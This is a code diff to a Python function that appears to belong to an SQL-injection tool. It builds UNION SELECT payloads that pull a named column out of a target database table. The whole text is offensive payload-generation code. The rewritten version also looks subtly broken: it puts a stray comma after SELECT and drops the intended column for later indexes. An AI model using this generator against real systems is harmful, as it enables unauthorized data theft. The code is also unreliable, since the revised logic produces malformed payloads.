@@ -14,31 +14,15 @@ log.set_config()
 
 
 def craft_exfil_pld(table, column, options: list):
-    db_comment, str_index = options[1], options[3]
-    scraped = False
+    db_comment, num_cols, str_index = options[1], options[2], options[3]
     # Defining the beginning of the payload
     pld = "' UNION SELECT"
-    # Traversing indexes that can contain string
-    for index in str_index:
-        # If we hit column that can handle string
-        if str_index[index - 1] == index:
-            # Checking if the current index is the first one or not
-            # If it is, adding column, otherwise adding NULL
-            # Scraped variable to not send same columns
-            if index == 1:
-                pld += f" {column}"
-                scraped = True
-            else:
-                if scraped:
-                    pld += ", NULL"
-                else:
-                    pld += f", {column}"
-        # If we hit column that cannot take string, we add NULL
-        else:
-            if index == 1:
-                pld += "NULL"
-            else:
-                pld += ", NULL"
+    # Traversing all columns and looking for indexes that can contain string
+    for index in range(1, int(num_cols) + 1):
+        # Determine the column value based on whether it's the first index and if it can handle strings
+        column_value = column if (index == 1) else "NULL" if (str_index[index - 1] != index) else None
+        # Add appropriate values to the payload, avoiding repetition by using conditional expressions
+        pld += f", {column_value}" if column_value is not None else ", NULL"
     pld += f" FROM {table}{db_comment}"
     return pld
 
